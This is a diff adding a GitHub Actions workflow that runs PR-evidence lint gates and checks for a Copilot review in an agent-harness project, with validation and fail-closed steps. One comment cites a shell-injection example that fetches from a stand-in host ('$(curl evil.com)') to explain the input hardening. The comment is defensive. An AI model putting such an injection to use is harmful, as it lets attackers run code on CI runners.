@@ -1,0 +1,220 @@
+# pr-evidence-lint.yml — PR-evidence aggregator gate per CS38a / CS36 / CS37 / ADR-0004.
+# Managed by the harness; regenerate via `harness sync` when a new harness
+# version is pinned. Only enabled when harness.config.json has
+# `review_gates.enabled: true` (see CS38a C38a-6) — the workflow itself is
+# always written but consumer's branch protection is what enforces it.
+
+name: pr-evidence-lint
+
+permissions:
+  contents: read
+  pull-requests: read
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened, edited, labeled, unlabeled]
+  workflow_dispatch:
+    inputs:
+      pr_number:
+        description: 'PR number to engage Copilot review for (mutation-only path).'
+        required: true
+        type: string
+
+jobs:
+  read-only-gates:
+    if: github.event_name == 'pull_request'
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      pull-requests: read
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
+        with:
+          fetch-depth: 0  # B1 needs full commit graph
+      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e  # v6.4.0
+        with:
+          node-version: '20'
+      - name: 'Pin npm >= 10.9 (works around npm 10.8.x GitFetcher bug)'
+        run: npm install -g npm@10.9.2
+      - name: 'Configure git url-rewrite for github: protocol (uses GITHUB_TOKEN)'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          git config --global url."https://x-access-token:${GH_TOKEN}@github.com/".insteadOf "git@github.com:"
+          git config --global url."https://x-access-token:${GH_TOKEN}@github.com/".insteadOf "https://github.com/"
+      - id: derive-ref
+        name: Derive + validate effective harness CLI ref
+        # CS12 R1 (PR #48 review): pass GitHub expressions through env: AND
+        # validate the derived ref against an allowlist regex BEFORE exporting
+        # as a step output. Direct interpolation into a `run:` shell would
+        # allow shell-injection (e.g. version=$(curl evil.com)).
+        env:
+          GH_REPO: ${{ github.repository }}
+          GH_SHA: ${{ github.event.pull_request.head.sha || github.sha }}
+        run: |
+          version=$(node -e "console.log(JSON.parse(require('fs').readFileSync('harness.config.json','utf8')).version || '')")
+          if [ -n "$version" ] && [ "$version" != "0.0.0-pre" ]; then
+            ref="$version"
+          elif [ "$GH_REPO" = "henrik-me/agent-harness" ]; then
+            ref="$GH_SHA"
+          else
+            echo "ERROR: harness.config.json version is empty or '0.0.0-pre' but this is not the henrik-me/agent-harness repo." >&2
+            exit 1
+          fi
+          if ! printf '%s' "$ref" | grep -Eq '^[a-zA-Z0-9._/-]+$'; then
+            echo "ERROR: ref \"$ref\" contains characters outside the allowlist [a-zA-Z0-9._/-]." >&2
+            exit 1
+          fi
+          echo "ref=$ref" >> "$GITHUB_OUTPUT"
+      - id: install-harness
+        name: Clone harness CLI at validated ref
+        env:
+          CLI_REF: ${{ steps.derive-ref.outputs.ref }}
+        run: |
+          tmpdir="$(mktemp -d)"
+          git clone --quiet --no-checkout https://github.com/henrik-me/agent-harness.git "$tmpdir"
+          cd "$tmpdir"
+          git checkout --quiet "$CLI_REF"
+          npm ci --omit=optional --no-audit --no-fund
+          echo "harness_dir=$tmpdir" >> "$GITHUB_OUTPUT"
+      - id: compute-skip-reasons
+        name: Compute --skip-reasons from event payload
+        # C35-19 / C36-5: compute only the centralized skip-reason vocabulary;
+        # the harness CLI decides which gates each reason skips.
+        env:
+          PR_LABELS: ${{ toJson(github.event.pull_request.labels.*.name) }}
+          PR_AUTHOR_LOGIN: ${{ github.event.pull_request.user.login }}
+          PR_HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}
+          PR_BASE_REPO: ${{ github.event.pull_request.base.repo.full_name }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUM: ${{ github.event.pull_request.number }}
+          REPO: ${{ github.repository }}
+        run: |
+          reasons=""
+          # workboard-only label short-circuits all gates (per C35-19) — but ONLY
+          # when the diff is confined to the workboard path allowlist (CS63 C63-7).
+          # A mislabeled PR touching files outside the allowlist is REJECTED here,
+          # not skipped, so the label cannot be used to bypass review on content.
+          if printf '%s' "$PR_LABELS" | grep -Fq '"workboard-only"'; then
+            # CS63 R8: rename/copy-source aware — check BOTH the current path and the
+            # previous (rename/copy source) path so a PR cannot rename a non-allowlisted
+            # file into an allowlisted path to dodge the workboard-only skip.
+            # Fail CLOSED on a gh api error (auth/rate-limit/network): capture the file
+            # list first so a failure is not masked by the grep's `|| true` below.
+            files=$(gh api --paginate "repos/${REPO}/pulls/${PR_NUM}/files" --jq '.[] | .filename, (.previous_filename // empty)') || { echo "::error ::workboard-only scope check: gh api failed; refusing to confirm bypass."; exit 1; }
+            outside=$(printf '%s\n' "$files" | grep -Ev '^(WORKBOARD\.md|CONTEXT\.md|LEARNINGS\.md)$|^project/clickstops/(planned|active|done)/' || true)
+            if [ -n "$outside" ]; then
+              echo "::error ::workboard-only label present but the PR changes files OUTSIDE the workboard allowlist (WORKBOARD.md / CONTEXT.md / LEARNINGS.md / project/clickstops/). Remove the label or split the PR."
+              printf '%s\n' "$outside" | sed 's/^/::error ::  outside-allowlist: /'
+              exit 1
+            fi
+            reasons="${reasons:+$reasons,}workboard-only"
+          fi
+          # Bot-author detection: GitHub App / bot accounts have a [bot] suffix on login.
+          if printf '%s' "$PR_AUTHOR_LOGIN" | grep -Eq '\[bot\]$'; then
+            reasons="${reasons:+$reasons,}bot-author"
+          fi
+          # Fork detection: head.repo != base.repo.
+          if [ "$PR_HEAD_REPO" != "$PR_BASE_REPO" ]; then
+            reasons="${reasons:+$reasons,}fork-source"
+          fi
+          echo "reasons=$reasons" >> "$GITHUB_OUTPUT"
+      - name: Fetch PR body to a file
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUM: ${{ github.event.pull_request.number }}
+        run: |
+          gh pr view "$PR_NUM" --json body --jq .body > /tmp/pr-body.md
+      # C38a R2 B1: SPLIT the pr-evidence invocation into two steps so that
+      # the Copilot-review gate (A5+A16) can be wrapped with continue-on-error
+      # on fork-source PRs (where check-copilot-review.mjs exits 2 — a state
+      # that the aggregator treats as failure but the workflow should surface
+      # as a notice, not a red CI). Per C38a-10:
+      #   - Step A: read-only gates (B1, A3+A4, A6) — continue-on-error: false
+      #   - Step B: Copilot review gate (A5+A16) — continue-on-error: true
+      #   - Step C: aggregate annotation reading steps.copilot-gate.outcome
+      # The aggregator naturally skips A5+A16 when --repo and --pr are absent
+      # (bin/harness.mjs:2196-2207), so Step A passes no repo/PR args.
+      - id: read-only-gates
+        name: Run harness pr-evidence (read-only gates B1+A3+A4+A6)
+        env:
+          HARNESS_DIR: ${{ steps.install-harness.outputs.harness_dir }}
+          PR_BASE_SHA: ${{ github.event.pull_request.base.sha }}
+          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          SKIP_REASONS: ${{ steps.compute-skip-reasons.outputs.reasons }}
+        run: |
+          args=(
+            --base "$PR_BASE_SHA"
+            --head "$PR_HEAD_SHA"
+            --pr-body /tmp/pr-body.md
+          )
+          if [ -n "$SKIP_REASONS" ]; then
+            args+=(--skip-reasons "$SKIP_REASONS")
+          fi
+          # No --repo / --pr → aggregator skips A5+A16 (gated separately below).
+          node "$HARNESS_DIR/bin/harness.mjs" pr-evidence "${args[@]}"
+      - id: copilot-gate
+        name: Run Copilot review gate (A5+A16)
+        # continue-on-error: true — fork-source PRs cause check-copilot-review.mjs
+        # to exit 2 (cannot request Copilot from forks). We surface the outcome
+        # via the next annotation step rather than failing the workflow.
+        continue-on-error: true
+        env:
+          HARNESS_DIR: ${{ steps.install-harness.outputs.harness_dir }}
+          GH_REPO_FULL: ${{ github.repository }}
+          PR_NUM: ${{ github.event.pull_request.number }}
+          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          SKIP_REASONS: ${{ steps.compute-skip-reasons.outputs.reasons }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          args=(
+            --repo "$GH_REPO_FULL"
+            --pr "$PR_NUM"
+            --head "$PR_HEAD_SHA"
+            --pr-body /tmp/pr-body.md
+          )
+          if [ -n "$SKIP_REASONS" ]; then
+            args+=(--skip-reasons "$SKIP_REASONS")
+          fi
+          # ADR4-8: this workflow VERIFIES Copilot engagement; it does NOT
+          # mutate. Engagement happens via the workflow_dispatch mutation-engage
+          # job below (or manually by maintainer via `gh pr edit
+          # --add-reviewer`). Engage-and-verify in the same workflow run will
+          # always fail first attempt because Copilot's review pipeline is
+          # asynchronous (~3 min).
+          node "$HARNESS_DIR/scripts/check-copilot-review.mjs" "${args[@]}"
+      - id: annotate-copilot-outcome
+        name: Annotate Copilot review gate outcome
+        env:
+          COPILOT_OUTCOME: ${{ steps.copilot-gate.outcome }}
+          SKIP_REASONS: ${{ steps.compute-skip-reasons.outputs.reasons }}
+        run: |
+          if [ "$COPILOT_OUTCOME" = "failure" ]; then
+            if printf '%s' "$SKIP_REASONS" | grep -Fq 'fork-source'; then
+              echo "::notice title=Copilot review gate skipped::Fork-source PR — Copilot review cannot be requested across forks (ADR4-2). Maintainer should engage manually after merge or via workflow_dispatch."
+            else
+              echo "::error title=Copilot review gate failed::A5+A16 did not pass. Maintainer should engage Copilot via the workflow_dispatch \"mutation-engage\" job or \`gh pr edit --add-reviewer copilot-pull-request-reviewer\`."
+              exit 1
+            fi
+          fi
+
+  mutation-engage:
+    if: github.event_name == 'workflow_dispatch'
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      pull-requests: write
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
+      - name: Engage Copilot reviewer
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUM: ${{ inputs.pr_number }}
+        run: |
+          # ADR4-2 (CS37 spike outcome): the GraphQL `requestReviews` mutation
+          # REJECTS Bot reviewer IDs. Engagement primitive is the REST-backed
+          # `gh pr edit --add-reviewer` invocation below (which the gh CLI
+          # translates to the Bot-aware REST requested_reviewers endpoint).
+          gh pr edit "$PR_NUM" --add-reviewer copilot-pull-request-reviewer
+          echo "Copilot review requested on PR #$PR_NUM. Verification will run on the next pull_request event (~3 min for Copilot to deliver)."
